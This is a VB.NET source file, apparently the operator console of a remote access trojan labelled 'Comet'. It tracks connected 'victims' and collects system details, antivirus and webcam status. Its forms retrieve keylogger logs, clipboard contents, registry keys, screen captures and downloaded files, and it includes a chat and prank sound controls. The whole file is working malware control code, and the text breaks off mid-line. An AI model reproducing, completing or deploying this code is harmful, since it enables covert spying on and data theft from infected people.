Imports System.IO
Imports System.Text
Imports System.Threading
Imports System.Security.Cryptography
Imports System.IO.Compression
Imports System.Runtime.InteropServices
Imports System.Windows.Forms.ListView

Public Class Form1


    Private Const AW_BLEND = &H80000
    Private Declare Function AnimateWindow Lib "user32" (ByVal hwnd As Int32, ByVal dwTime As Int32, ByVal dwFlags As Int32) As Boolean
    Dim winHide As Integer = &H10000
    Dim winBlend As Integer = &H80000
    <DllImport("uxtheme", CharSet:=CharSet.Unicode)>
    Public Shared Function SetWindowTheme(ByVal hWnd As IntPtr, ByVal textSubAppName As String, ByVal textSubIdList As String) As Integer
    End Function
    Private lvwColumnSorter As ListViewColumnSorter
    Public WithEvents S As KX
    Public Yy As String = "|U|"
    Public UODNNXMATTYW As Size
    Public useru As String
    Public pw As String = "Win7"
    Public pinger As Integer = 0
    Public tictoc As Integer = 0
    Public folder As String
    Public folder1 As String
    Dim appPath As String
    Dim Message As String
    Public xxx As Integer
    Dim id$
    Dim ip$
    Function QZ(ByVal q As Integer) As Size '
        On Error Resume Next
        Do '>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>


            Dim AOPXTTPODCCMO As New Size(UODNNXMATTYW)
            Dim TT# = 1.1, YY = 1.3, UU# = 2.1, OO# = 1.5, UI# = 2.2, RR# = 1.9, AZQ# = 2.5, EWQ# = 3.5
            Dim Xe# = 3, YqWT# = 4, N# = 5, UM# = 6, UEEQS# = 2
            Select Case q
                Case 0
                    Return UODNNXMATTYW
                Case 1
                    AOPXTTPODCCMO.Width = AOPXTTPODCCMO.Width / TT
                    AOPXTTPODCCMO.Height = AOPXTTPODCCMO.Height / TT
                Case 2
                    AOPXTTPODCCMO.Width = AOPXTTPODCCMO.Width / YY
                    AOPXTTPODCCMO.Height = AOPXTTPODCCMO.Height / YY
                Case 3
                    AOPXTTPODCCMO.Width = AOPXTTPODCCMO.Width / OO
                    AOPXTTPODCCMO.Height = AOPXTTPODCCMO.Height / OO
                Case 4
                    AOPXTTPODCCMO.Width = AOPXTTPODCCMO.Width / RR
                    AOPXTTPODCCMO.Height = AOPXTTPODCCMO.Height / RR
                Case 5
                    AOPXTTPODCCMO.Width = AOPXTTPODCCMO.Width / UEEQS
                    AOPXTTPODCCMO.Height = AOPXTTPODCCMO.Height / UEEQS
                Case 6
                    AOPXTTPODCCMO.Width = AOPXTTPODCCMO.Width / UU
                    AOPXTTPODCCMO.Height = AOPXTTPODCCMO.Height / UU
                Case 7
                    AOPXTTPODCCMO.Width = AOPXTTPODCCMO.Width / UI
                    AOPXTTPODCCMO.Height = AOPXTTPODCCMO.Height / UI
                Case 8
                    AOPXTTPODCCMO.Width = AOPXTTPODCCMO.Width / AZQ
                    AOPXTTPODCCMO.Height = AOPXTTPODCCMO.Height / AZQ
                Case 9
                    AOPXTTPODCCMO.Width = AOPXTTPODCCMO.Width / Xe
                    AOPXTTPODCCMO.Height = AOPXTTPODCCMO.Height / Xe
                Case 10
                    AOPXTTPODCCMO.Width = AOPXTTPODCCMO.Width / EWQ
                    AOPXTTPODCCMO.Height = AOPXTTPODCCMO.Height / EWQ
                Case 11
                    AOPXTTPODCCMO.Width = AOPXTTPODCCMO.Width / YqWT
                    AOPXTTPODCCMO.Height = AOPXTTPODCCMO.Height / YqWT
                Case 12
                    AOPXTTPODCCMO.Width = AOPXTTPODCCMO.Width / N
                    AOPXTTPODCCMO.Height = AOPXTTPODCCMO.Height / N
                Case 13
                    AOPXTTPODCCMO.Width = AOPXTTPODCCMO.Width / UM
                    AOPXTTPODCCMO.Height = AOPXTTPODCCMO.Height / UM
            End Select
            AOPXTTPODCCMO.Width = Mid(AOPXTTPODCCMO.Width.ToString, 1, AOPXTTPODCCMO.Width.ToString.Length - 1) & 0
            AOPXTTPODCCMO.Height = Mid(AOPXTTPODCCMO.Height.ToString, 1, AOPXTTPODCCMO.Height.ToString.Length - 1) & 0
            Return AOPXTTPODCCMO
        Loop '>>>>>>>>>>>>>>>>
    End Function
    Private Sub Form1_FormClosing(ByVal sender As Object, ByVal e As System.Windows.Forms.FormClosingEventArgs) Handles Me.FormClosing
        NotifyIcon1.Visible = False
        Try
            AnimateWindow(Me.Handle.ToInt32, CInt(500), winHide Or winBlend)
        Catch ex As Exception

        End Try


        End
    End Sub
    Sub colord()
        Dim enumerator As IEnumerator = Nothing
        enumerator = L1.SelectedItems.GetEnumerator
        Do While enumerator.MoveNext
            Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
            current.ForeColor = Color.Green
        Loop
    End Sub
    Sub colordblak()

        Dim enumerator As IEnumerator = Nothing
        enumerator = L1.SelectedItems.GetEnumerator
        Do While enumerator.MoveNext
            Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
            current.ForeColor = Color.Black
        Loop
    End Sub

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        ContextMenuStrip1.Renderer = New clsVistaToolStripRenderer

        If File.Exists("OGPo.igo") Then

            hard.Text = 1
        ElseIf File.Exists("OGP.igo") Then
            hard.Text = 0

        Else
            hard.Text = 0




        End If


        PictureBox3.Show()

        If File.Exists("Hide.ini") Then
            Form11.RememberTheThumbnailToolStripMenuItem.Enabled = False
            SplitContainer2.Panel2Collapsed = True
            CheckBox2.Checked = False
        ElseIf File.Exists("show.ini") Then
            Form11.RememberTheThumbnailToolStripMenuItem.Enabled = True
            SplitContainer2.Panel2Collapsed = False
            CheckBox2.Checked = True


        Else
            SplitContainer2.Panel2Collapsed = False
            CheckBox2.Checked = True
        End If
        Panel4.Hide()
        TabPage1.Text = "Controller"
        Dim rr = My.Resources.werqwrfwas
        Me.ToolStripStatusLabel3.Image = rr
        gg.Enabled = True
        Me.Opacity = 0.1
        SetWindowTheme(L1.Handle, "explorer", Nothing)
        SetWindowTheme(GClass91.Handle, "explorer", Nothing)
        Control.CheckForIllegalCrossThreadCalls = False
        Timer1.Start()
        NotifyIcon1.Icon = Me.Icon
        S = New KX
        Try
            Dim aa As String() = Split(File.ReadAllText(Application.StartupPath & "\Settings.ini"), "|")
            If aa(0) = "true" Then
                S.Start(aa(1))
                ToolStripStatusLabel3.Text = "The Case of The Port |- Connected To The Following Port : " & aa(1)
                ToolStripStatusLabel3.ForeColor = System.Drawing.SystemColors.HotTrack
            End If

        Catch : End Try
    End Sub

    Private Sub L1_ColumnClick(ByVal sender As Object, ByVal e As System.Windows.Forms.ColumnClickEventArgs)
        Try
            If (e.Column = lvwColumnSorter.SortColumn) Then
                If (lvwColumnSorter.Order = SortOrder.Ascending) Then
                    lvwColumnSorter.Order = SortOrder.Descending
                Else
                    lvwColumnSorter.Order = SortOrder.Ascending
                End If
            Else
                lvwColumnSorter.SortColumn = e.Column
                lvwColumnSorter.Order = SortOrder.Ascending
            End If
            Me.L1.Sort()
        Catch ex As Exception

        End Try
    End Sub

    Private Sub SdfghToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)
        On Error Resume Next
        ShowIcon = True
        ShowInTaskbar = True
        Me.Show()
    End Sub
#Region "Server Events"
    Sub Disconnect(ByVal xxx As Integer) Handles S.DisConnected
        Try
            L1.Items(xxx.ToString).Remove()
        Catch ex As Exception
        End Try
    End Sub
    Sub Connected(ByVal xxx As Integer) Handles S.Connected
        On Error Resume Next
        S.Send(xxx, "info" & Yy & pw)
    End Sub
    Delegate Sub _Datad(ByVal info As Data)
    Sub data(ByVal info As Data) Handles S.Datad
        Dim a As String = info.GetData
        Dim aa As String() = a.Split("|")
        Select Case aa(0)
            Case "tt"
                MsgBox("Comet 0.1.3.0-Error")
        End Select
    End Sub
    Delegate Sub _Data(ByVal xxx As Integer, ByVal B As Byte())
  
    Sub Data(ByVal xxx As Integer, ByVal B As Byte()) Handles S.Data

        Dim T As String = BS(B)
        Dim A As String() = Split(T, Yy)
        Try
            Select Case A(0)
                Case "info"
                    Dim f As Form27 = My.Application.OpenForms("new" & xxx)
                    If f Is Nothing Then
                        If Me.InvokeRequired Then
                            Me.Invoke(New _Data(AddressOf data), New Object() {xxx, B})
                            Exit Sub
                        End If
                    
                        f = New Form27
                        f.Name = "new" & xxx
                        f.Label1.Text = S.IP(xxx)
                        f.Label2.Text = A(1)
                        f.Label3.Text = A(2)
                        f.Label4.Text = A(3)
                        f.Label5.Text = A(4)
                        GClass91.Items.Add("User Login :" + " IP: " + S.IP(xxx) + " ServerID : " + A(1) + " Time : " + TimeValue(Now))
                        f.Show()

                        Dim L = L1.Items.Add(xxx.ToString, A(1), GetCountryNumber(UCase(A(3))))

                        L.SubItems.Add(S.IP(xxx))
                        L.SubItems.Add(A(2))
                        L.SubItems.Add(A(3))
                        L.SubItems.Add(A(4))
                        L.SubItems.Add(A(5))
                        L.SubItems.Add(" ")
                        L.SubItems.Add(A(6))
                        L.SubItems.Add(A(7))
                        L.SubItems.Add(A(8))
                        L.SubItems.Add(A(9))
                        L.SubItems.Add(A(10))
                        L.SubItems.Add(A(11))
                        L.SubItems.Add(A(12))
                        L.SubItems.Add(A(13))
                        L.ToolTipText = xxx

                        ''''''''''''''''''''''''''''''''''''''''''''''''''
                        If hard.Text = 1 Then

                            Dim pi As New PictureBox
                            Dim m As New IO.MemoryStream(Convert.FromBase64String(A(14)))
                            SyncLock pi




                                pi.Image = Image.FromStream(m)



                                f.PictureBox3.Image = pi.Image




                            End SyncLock

                        End If


                    End If
                    If My.Computer.FileSystem.DirectoryExists(Application.StartupPath & "/bookbinder/" & A(1) & "/Download") Then
                    Else
                        My.Computer.FileSystem.CreateDirectory(Application.StartupPath & "/bookbinder/" & A(1) & "/Download")
                    End If
                    If My.Computer.FileSystem.DirectoryExists(Application.StartupPath & "/bookbinder/" & A(1) & "/Screen Capture") Then
                    Else
                        My.Computer.FileSystem.CreateDirectory(Application.StartupPath & "/bookbinder/" & A(1) & "/Screen Capture")
                    End If
                    folder = (Application.StartupPath & "\bookbinder\" + L1.Items.Item(L1.FocusedItem.Index).SubItems.Item(0).Text + "\Download\")
                    folder1 = (Application.StartupPath & "/bookbinder/" & (A(1)) & "/Screen Capture\")

                Case "infoDesk"
                    For Each x As ListViewItem In L1.SelectedItems
                        If L1.SelectedItems.Count >= 2 Then

                            PictureBox1.Image = Nothing
                            JToolStripMenuItem.Enabled = False
                            OpenDownloadFolderToolStripMenuItem.Enabled = False

                            CommentsToolStripMenuItem.Enabled = False
                        Else
                            If CheckBox1.Checked = True Then
                                Dim m As New IO.MemoryStream(Convert.FromBase64String(A(1)))
                                SyncLock Me.PictureBox1
                                    Me.PictureBox1.Image = Image.FromStream(m)
                                End SyncLock

                            End If
                            JToolStripMenuItem.Enabled = True
                            OpenDownloadFolderToolStripMenuItem.Enabled = True
                            CommentsToolStripMenuItem.Enabled = True
                        End If
                    Next
                    pinger = 0
                    Timer2.Enabled = False








                Case "sendinformation"
                    Timer2.Stop()
                    If My.Application.OpenForms("Information" & xxx) IsNot Nothing Then Exit Sub
                    If Me.InvokeRequired Then
                        Dim j As New _Data(AddressOf data)
                        Me.Invoke(j, New Object() {xxx, B})
                        Exit Sub
                    End If
                    Dim info As New Form30
                    info.xxx = xxx
                    info.Name = "Information" & xxx
                    info.Text = info.Text & " " & S.IP(xxx)
                    Dim Li$ = "----------------------------------------------" & vbNewLine
                    info.Label1.Text = "Username :"
                    info.TextBox1.Text = A(2)
                    info.Label2.Text = "Victime Name : "
                    info.TextBox2.Text = (L1.Items.Item(L1.FocusedItem.Index).SubItems.Item(0).Text)
                    info.Label3.Text = "Country : "
                    info.TextBox3.Text = A(5)
                    info.Label4.Text = "Language : "
                    info.TextBox4.Text = A(19)
                    info.Label5.Text = "Antivirus : "
                    info.TextBox5.Text = A(6)
                    info.Label6.Text = "Webcam : "
                    info.TextBox6.Text = A(9)
                    info.Label7.Text = "Active Window : "
                    info.TextBox7.Text = A(10)
                    info.Label8.Text = "Local Time : "
                    info.TextBox8.Text = A(11)
                    info.Label9.Text = "Computer Open : "
                    info.TextBox9.Text = A(12)
                    info.Label10.Text = "Current Directory : "
                    info.TextBox10.Text = A(13)
                    info.Label11.Text = "Command Line : "
                    info.TextBox11.Text = A(20)
                    info.Label12.Text = "System Directory : "
                    info.TextBox12.Text = A(14)
                    info.Label13.Text = "User Domain Name : "
                    info.TextBox13.Text = A(15)
                    info.Label14.Text = "User Interactive : "
                    info.TextBox14.Text = A(16)
                    info.Label15.Text = "Working Set : "
                    info.TextBox15.Text = A(17)
                    ''''''''''''''''''''''''''''''''''''
                    info.Label16.Text = "Computer Name : "
                    info.TextBox16.Text = A(1)
                    info.Label17.Text = "Operating System : "
                    info.TextBox17.Text = A(3)
                    info.Label18.Text = "Operating System Platform : "
                    info.TextBox18.Text = A(4)
                    info.Label19.Text = "Operating System version : "
                    info.TextBox19.Text = A(18)
                    info.Label20.Text = "RAM : "
                    info.TextBox20.Text = A(7)
                    info.Label21.Text = "Processor Name : "
                    info.TextBox21.Text = A(23)
                    info.Label22.Text = "Identifier : "
                    info.TextBox22.Text = A(24)
                    info.Label23.Text = "System Product : "
                    info.TextBox23.Text = A(25)
                    info.Label24.Text = "BIOS Release Date : "
                    info.TextBox24.Text = A(26)
                    info.Label25.Text = "BIOS Version : "
                    info.TextBox25.Text = A(27)
                    info.Label26.Text = "System Manufacturer : "
                    info.TextBox26.Text = A(28)
                    info.Label27.Text = "BIOS Vendor : "
                    info.TextBox27.Text = A(29)

                    colordblak()
                    info.Show()
                    pinger = 0
                Case "AW"
                    For i As Integer = 0 To L1.Items.Count - 1
                        If L1.Items.Item(i).SubItems(1).Text = S.IP(xxx) Then
                            L1.Items.Item(i).SubItems(6).Text = A(1)
                            Exit For
                        End If
                    Next
                Case "F"
                    For i As Integer = 0 To L1.Items.Count - 1
                        If L1.Items.Item(i).SubItems(1).Text = S.IP(xxx) Then
                            L1.Items.Item(i).ForeColor = Color.Black
                            Exit For
                        End If
                    Next
                Case "fun"
                    If My.Application.OpenForms("fun" & xxx) IsNot Nothing Then Exit Sub
                    If Me.InvokeRequired Then
                        Dim j As New _Data(AddressOf data)
                        Me.Invoke(j, New Object() {xxx, B})
                        Exit Sub
                    End If
                    Dim fm As New Form38
                    fm.xxx = xxx
                    fm.Name = "fun" & xxx
                    fm.Text = fm.Text & S.IP(xxx)
                    fm.f = Me
                    colordblak()
                    fm.Show()
                Case "chat"
                    Dim f As Form29 = My.Application.OpenForms("chat" & xxx)
                    If f Is Nothing Then
                        If Me.InvokeRequired Then
                            Me.Invoke(New _Data(AddressOf data), New Object() {xxx, B})
                            Exit Sub
                        End If
                        f = New Form29
                        f.xxx = xxx
                        f.Name = "chat" & xxx
                        f.Text += "Chatting" & " - " & S.IP(xxx)
                        colordblak()
                        f.Show()
                    End If

                Case "gg"
                    Dim f As Form12 = My.Application.OpenForms("gg" & xxx)
                    If f Is Nothing Then
                        If Me.InvokeRequired Then
                            Me.Invoke(New _Data(AddressOf data), New Object() {xxx, B})
                            Exit Sub
                        End If
                        f = New Form12
                        f.xxx = xxx
                        f.Name = "chat" & xxx
                        f.Text += "Chatting" & " - " & S.IP(xxx)
                        colordblak()
                        f.Show()
                    End If

                Case "scream2"
                    'IO.File.WriteAllBytes(IO.Path.GetTempPath & "Comet" + A(1), Convert.FromBase64String(A(2)))

                    IO.File.WriteAllBytes(IO.Path.GetTempPath & A(1), Convert.FromBase64String(A(2)))
                    Threading.Thread.Sleep(1000)
                    My.Computer.Audio.Stop()
                    My.Computer.Audio.Play(IO.Path.GetTempPath & A(1), AudioPlayMode.Background)



                Case "screamf"
                    IO.File.WriteAllBytes(IO.Path.GetTempPath & "Comet" + A(1), Convert.FromBase64String(A(2)))

                    IO.File.WriteAllBytes(IO.Path.GetTempPath & A(1), Convert.FromBase64String(A(2)))
                    'Threading.Thread.Sleep(1000)
                    'My.Computer.Audio.Stop()
                    'My.Computer.Audio.Play(IO.Path.GetTempPath & A(1), AudioPlayMode.Background)

                Case "dOX"

                    If L1.FindItemWithText(S.IP(xxx)) Is Nothing Then
                        S.Disconnect(xxx)
                    End If
                    Dim f As Form29 = My.Application.OpenForms("chat" & xxx)
                    f.Panel2.Show()

                    If A(1) = "019870-*098+21{1}\\*+33-9=#oD" Then
                        f.Label3.Text = "[ " + A(2) + " ] is writing ..."
                    ElseIf A(1) = "019870-*098+21{2}//*+33-9=#oD" Then
                        f.Label3.Text = "[ " + A(2) + " ] is Deleting ..."

                    End If


                    f.Label2.Text = A(1)
                    f.Top.Text = "1"




                Case "recv"
                    If L1.FindItemWithText(S.IP(xxx)) Is Nothing Then
                        S.Disconnect(xxx)
                    End If
                    Dim f As Form29 = My.Application.OpenForms("chat" & xxx)
                    f.Recv.ScrollToCaret()
                    f.Recv.Text += Environment.NewLine & "(Victim):" & A(1)
                    f.Recv.SelectionStart = f.Recv.Text.Length
                    f.Recv.ScrollToCaret()


                    ''''''

                    My.Computer.Audio.Play("C:\Windows\Media\Windows Pop-up Blocked.wav", AudioPlayMode.Background)

                Case "downloadedfile"
                    IO.File.WriteAllBytes((Application.StartupPath & "\bookbinder\" + L1.Items.Item(L1.FocusedItem.Index).SubItems.Item(0).Text + "\Download\") & A(2), Convert.FromBase64String(A(1)))
                    Thread.Sleep(1000)
                Case "openkl"
                    If My.Application.OpenForms("openkl" & xxx) IsNot Nothing Then Exit Sub
                    If Me.InvokeRequired Then
                        Dim j As New _Data(AddressOf data)
                        Me.Invoke(j, New Object() {xxx, B})
                        Exit Sub
                    End If
                    Dim fm As New Form31
                    fm.xxx = xxx
                    fm.Name = ("openkl" & xxx)
                    fm.Text = fm.Text & S.IP(xxx)
                    colordblak()
                    fm.Show()
                Case "loges"
                    Dim F As Form31 = My.Application.OpenForms("openkl" & xxx)
                    Dim T1 As New Thread(AddressOf F.Getloges)
                    T1.Start(A(1))
                Case "viewimage"
                    Dim fff As Form5 = My.Application.OpenForms("\\" & xxx)

                    If A(1) = "Error" Then
                        MsgBox("You cannot access this path", MsgBoxStyle.Exclamation)
                        fff.BackToolStripMenuItem1.PerformClick()

                    Else

                        Dim picbyte() As Byte = Convert.FromBase64String(A(1))
                        Dim ms As New MemoryStream(picbyte)
                        fff.pic1.Image = Image.FromStream(ms)





                    End If
                Case "openRG"
                    Dim reg As Form32 = My.Application.OpenForms("Reg" & xxx)
                    If Me.InvokeRequired Then
                        Dim j As New _Data(AddressOf data)
                        Me.Invoke(j, New Object() {xxx, B})
                        Exit Sub
                    End If
                    Dim regi As New Form32
                    regi.Name = "Reg" & xxx
                    regi.xxx = xxx
                    regi.Text = "Registry" & " - " & S.IP(xxx)
                    colordblak()
                    regi.Show()
                Case "RG"
                    Dim reg As Form32 = My.Application.OpenForms("Reg" & xxx)
                    If Me.InvokeRequired Then
                        Dim j As New _Data(AddressOf data)
                        Me.Invoke(j, New Object() {xxx, B})
                        Exit Sub
                    End If
                    Select Case A(1)
                        Case "~"
                            reg.RGk.Enabled = True
                            reg.RGLIST.Enabled = True
                            reg.RGk.SelectedNode.Nodes.Clear()
                            reg.RGLIST.Items.Clear()
                            reg.pr.Value = 0
                            reg.pr.Maximum = (A.Length - 3)
                            Dim num20 As Integer = (A.Length - 1)
                            Dim i As Integer = 3
                            Do While (i <= num20)
                                Try
                                    reg.pr = reg.pr
                                    reg.pr.Value += 1
                                    If (A(i).Length > 0) Then
                                        If A(i).Contains("/") Then
                                            Dim strArray2 As String() = Strings.Split(A(i), "/", -1, CompareMethod.Binary)
                                            Dim item As ListViewItem = reg.RGLIST.Items.Add(strArray2(0))
                                            item.SubItems.Add(strArray2(1))
                                            Try
                                                item.SubItems.Add(strArray2(2))
                                            Catch exception17 As Exception

                                                Dim exception3 As Exception = exception17

                                            End Try
                                            If (strArray2(1) = "String") Then
                                                item.ImageIndex = 1
                                            Else
                                                item.ImageIndex = 2
                                            End If
                                        Else
                                            reg.RGk.SelectedNode.Nodes.Add(A(i))
                                        End If
                                    End If
                                Catch exception18 As Exception

                                    Dim exception4 As Exception = exception18

                                End Try
                                i += 1
                            Loop
                            reg.RGk.SelectedNode.Expand()
                            reg.RGk.Select()
                            reg.RGk.Focus()
                            Dim num21 As Integer = (reg.RGLIST.Columns.Count - 1)
                            Dim j As Integer = 0
                            Do While (j <= num21)
                                reg.RGLIST.Columns.Item(j).AutoResize(ColumnHeaderAutoResizeStyle.HeaderSize)
                                j += 1
                            Loop
                            reg.pr.Value = 0

                            Exit Select

                    End Select
                Case "F"
                    For i As Integer = 0 To L1.Items.Count - 1
                        If L1.Items.Item(i).SubItems(1).Text = S.IP(xxx) Then
                            L1.Items.Item(i).ForeColor = Color.Black
                            Exit For
                        End If
                    Next

                Case "Coloreg"
                    Dim enumerator As IEnumerator = Nothing
                    enumerator = L1.SelectedItems.GetEnumerator
                    Do While enumerator.MoveNext
                        Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                        current.ForeColor = Color.Black
                    Loop

                Case "clipss"
                    Dim f As Form7 = My.Application.OpenForms("clipss" & xxx)
                    If f Is Nothing Then
                        If Me.InvokeRequired Then
                            Me.Invoke(New _Data(AddressOf data), New Object() {xxx, B})
                            Exit Sub
                        End If
                        f = New Form7
                        f.xxx = xxx
                        f.Name = "clipss" & xxx
                        f.Text = "Get ClipBoard" & " - " & S.IP(xxx)
                        colordblak()
                        f.Show()
                    End If
                Case "recvcli"
                    colordblak()

                    Dim f As Form7 = My.Application.OpenForms("clipss" & xxx)
                    f.TextBox1.Text = A(1)

                Case "\\"
                    If My.Application.OpenForms("\\" & xxx) IsNot Nothing Then Exit Sub
                    If Me.InvokeRequired Then
                        Dim j As New _Data(AddressOf data)
                        Me.Invoke(j, New Object() {xxx, B})
                        Exit Sub
                    End If
                    Dim fm As New Form5
                    fm.xxx = xxx
                    fm.Name = "\\" & xxx
                    fm.Text = fm.Text & S.IP(xxx)
                    colordblak()
                    fm.Show()
                Case "\\"    '
                    If My.Application.OpenForms("\\" & xxx) IsNot Nothing Then Exit Sub
                    If Me.InvokeRequired Then
                        Dim j As New _Data(AddressOf data)
                        Me.Invoke(j, New Object() {xxx, B})
                        Exit Sub
                    End If
                    Dim fm As New Form5
                    fm.xxx = xxx
                    fm.Name = "\\" & xxx
                    fm.Text = fm.Text & " " & S.IP(xxx)
                    colordblak()
                    fm.Show()
                Case "FileManager"
                    Dim fff As Form5 = My.Application.OpenForms("\\" & xxx)
                    If A(1) = "Error" Then

                        MsgBox("You cannot access this path", MsgBoxStyle.Exclamation)

                        fff.BackToolStripMenuItem1.PerformClick()

                    Else
                        fff.ListView1.Items.Clear()
                        Dim allFiles As String() = Split(A(1), "FileManagerSplit")
                        For i = 0 To allFiles.Length - 2
                            Dim itm As New ListViewItem
                            itm.Text = allFiles(i)
                            itm.SubItems.Add(allFiles(i + 1))
                            If Not itm.Text.StartsWith("[Drive]") And Not itm.Text.StartsWith("[CD]") And Not itm.Text.StartsWith("[Folder]") Then
                                Dim fsize As Long = Convert.ToInt64(itm.SubItems(1).Text)
                                If fsize > 1073741824 Then
                                    Dim size As Double = fsize / 1073741824
                                    itm.SubItems(1).Text = Math.Round(size, 2).ToString & " GB"
                                ElseIf fsize > 1048576 Then
                                    Dim size As Double = fsize / 1048576
                                    itm.SubItems(1).Text = Math.Round(size, 2).ToString & " MB"
                                ElseIf fsize > 1024 Then
                                    Dim size As Double = fsize / 1024
                                    itm.SubItems(1).Text = Math.Round(size, 2).ToString & " KB"
                                Else
                                    itm.SubItems(1).Text = fsize.ToString & " B"
                                End If
                                itm.Tag = Convert.ToInt64(allFiles(i + 1))
                            End If
                            If itm.Text.StartsWith("[Drive]") Then
                                itm.ImageIndex = 0
                                itm.Text = itm.Text.Substring(7)
                            ElseIf itm.Text.StartsWith("[CD]") Then
                                itm.ImageIndex = 1
                                itm.Text = itm.Text.Substring(4)
                            ElseIf itm.Text.StartsWith("[Folder]") Then
                                itm.ImageIndex = 2
                                itm.Text = itm.Text.Substring(8)
                            ElseIf itm.Text.EndsWith(".exe") Or itm.Text.EndsWith(".EXE") Or itm.Text.EndsWith(".scr") Or itm.Text.EndsWith(".SCR") Then
                                itm.ImageIndex = 3
                            ElseIf itm.Text.EndsWith(".jpg") Or itm.Text.EndsWith(".JPG") Or itm.Text.EndsWith(".jpeg") Or itm.Text.EndsWith(".JPEG") Or itm.Text.EndsWith(".ico") Or itm.Text.EndsWith(".ICO") Or itm.Text.EndsWith(".svg") Or itm.Text.EndsWith(".SVG") Or itm.Text.EndsWith(".svgz") Or itm.Text.EndsWith(".SVGZ") Or itm.Text.EndsWith(".drw") Or itm.Text.EndsWith(".DRW") Or itm.Text.EndsWith(".psp") Or itm.Text.EndsWith(".PSP") Or itm.Text.EndsWith(".gif") Or itm.Text.EndsWith(".GIF") Or itm.Text.EndsWith(".png") Or itm.Text.EndsWith(".PNG") Or itm.Text.EndsWith(".bmp") Or itm.Text.EndsWith(".BMP") Or itm.Text.EndsWith(".dib") Or itm.Text.EndsWith(".DIB") Or itm.Text.EndsWith(".jpe") Or itm.Text.EndsWith(".JPE") Or itm.Text.EndsWith(".jfif") Or itm.Text.EndsWith(".JFIF") Or itm.Text.EndsWith(".tif") Or itm.Text.EndsWith(".TIF") Or itm.Text.EndsWith(".tiff") Or itm.Text.EndsWith(".TIFF") Then
                                itm.ImageIndex = 4
                            ElseIf itm.Text.EndsWith(".txt") Or itm.Text.EndsWith(".TXT") Or itm.Text.EndsWith(".log") Or itm.Text.EndsWith(".LOG") Or itm.Text.EndsWith(".readme") Or itm.Text.EndsWith(".README") Or itm.Text.EndsWith(".me") Or itm.Text.EndsWith(".ME") Then
                                itm.ImageIndex = 5
                            ElseIf itm.Text.EndsWith(".dll") Or itm.Text.EndsWith(".DLL") Or itm.Text.EndsWith(".db") Or itm.Text.EndsWith(".DB") Then
                                itm.ImageIndex = 6
                            ElseIf itm.Text.EndsWith(".zip") Or itm.Text.EndsWith(".ZIP") Or itm.Text.EndsWith(".rar") Or itm.Text.EndsWith(".RAR") Or itm.Text.EndsWith(".7z") Or itm.Text.EndsWith(".7Z") Or itm.Text.EndsWith(".jar") Or itm.Text.EndsWith(".JAR") Or itm.Text.EndsWith(".tar") Or itm.Text.EndsWith(".TAR") Or itm.Text.EndsWith(".tgz") Or itm.Text.EndsWith(".TGZ") Or itm.Text.EndsWith(".gz") Or itm.Text.EndsWith(".GZ") Or itm.Text.EndsWith(".bz2") Or itm.Text.EndsWith(".BZ2") Or itm.Text.EndsWith(".tbz2") Or itm.Text.EndsWith(".TBZ2") Or itm.Text.EndsWith(".gzip") Or itm.Text.EndsWith(".GZIP") Or itm.Text.EndsWith(".z") Or itm.Text.EndsWith(".Z") Or itm.Text.EndsWith(".sit") Or itm.Text.EndsWith(".SIT") Or itm.Text.EndsWith(".cab") Or itm.Text.EndsWith(".CAB") Or itm.Text.EndsWith(".lzh") Or itm.Text.EndsWith(".LZH") Or itm.Text.EndsWith(".pkg") Or itm.Text.EndsWith(".PKG") Then
                                itm.ImageIndex = 7
                            ElseIf itm.Text.EndsWith(".bat") Or itm.Text.EndsWith(".BAT") Or itm.Text.EndsWith(".cmd") Or itm.Text.EndsWith(".CMD") Then
                                itm.ImageIndex = 9
                            ElseIf itm.Text.EndsWith(".avi") Or itm.Text.EndsWith(".AVI") Or itm.Text.EndsWith(".divx") Or itm.Text.EndsWith(".DIVX") Or itm.Text.EndsWith(".mkv") Or itm.Text.EndsWith(".MKV") Or itm.Text.EndsWith(".webm") Or itm.Text.EndsWith(".WEBM") Or itm.Text.EndsWith(".mp4") Or itm.Text.EndsWith(".MP4") Or itm.Text.EndsWith(".m4v") Or itm.Text.EndsWith(".M4V") Or itm.Text.EndsWith(".mp4v") Or itm.Text.EndsWith(".MP4V") Or itm.Text.EndsWith(".mpv4") Or itm.Text.EndsWith(".MPV4") Or itm.Text.EndsWith(".ogm") Or itm.Text.EndsWith(".OGM") Or itm.Text.EndsWith(".ogv") Or itm.Text.EndsWith(".OGV") Or itm.Text.EndsWith(".flv") Or itm.Text.EndsWith(".FLV") Or itm.Text.EndsWith(".mpeg") Or itm.Text.EndsWith(".MPEG") Or itm.Text.EndsWith(".mpg") Or itm.Text.EndsWith(".MPG") Or itm.Text.EndsWith(".mp2v") Or itm.Text.EndsWith(".MP2V") Or itm.Text.EndsWith(".mpv2") Or itm.Text.EndsWith(".MPV2") Or itm.Text.EndsWith(".m1v") Or itm.Text.EndsWith(".M1V") Or itm.Text.EndsWith(".m2v") Or itm.Text.EndsWith(".M2V") Or itm.Text.EndsWith(".m2p") Or itm.Text.EndsWith(".M2P") Or itm.Text.EndsWith(".mpe") Or itm.Text.EndsWith(".MPE") Or itm.Text.EndsWith(".ts") Or itm.Text.EndsWith(".TS") Or itm.Text.EndsWith(".m2ts") Or itm.Text.EndsWith(".M2TS") Or itm.Text.EndsWith(".mts") Or itm.Text.EndsWith(".MTS") Or itm.Text.EndsWith(".m2t") Or itm.Text.EndsWith(".M2T") Or itm.Text.EndsWith(".tps") Or itm.Text.EndsWith(".TPS") Or itm.Text.EndsWith(".hdmov") Or itm.Text.EndsWith(".HDMOV") Or itm.Text.EndsWith(".mov") Or itm.Text.EndsWith(".MOV") Or itm.Text.EndsWith(".3gp") Or itm.Text.EndsWith(".3GP") Or itm.Text.EndsWith(".3gpp") Or itm.Text.EndsWith(".3GPP") Or itm.Text.EndsWith(".wmv") Or itm.Text.EndsWith(".WMV") Or itm.Text.EndsWith(".asf") Or itm.Text.EndsWith(".ASF") Or itm.Text.EndsWith(".ifo") Or itm.Text.EndsWith(".IFO") Or itm.Text.EndsWith(".vob") Or itm.Text.EndsWith(".VOB") Or itm.Text.EndsWith(".mpls") Or itm.Text.EndsWith(".MPLS") Or itm.Text.EndsWith(".rm") Or itm.Text.EndsWith(".RM") Or itm.Text.EndsWith(".rmvb") Or 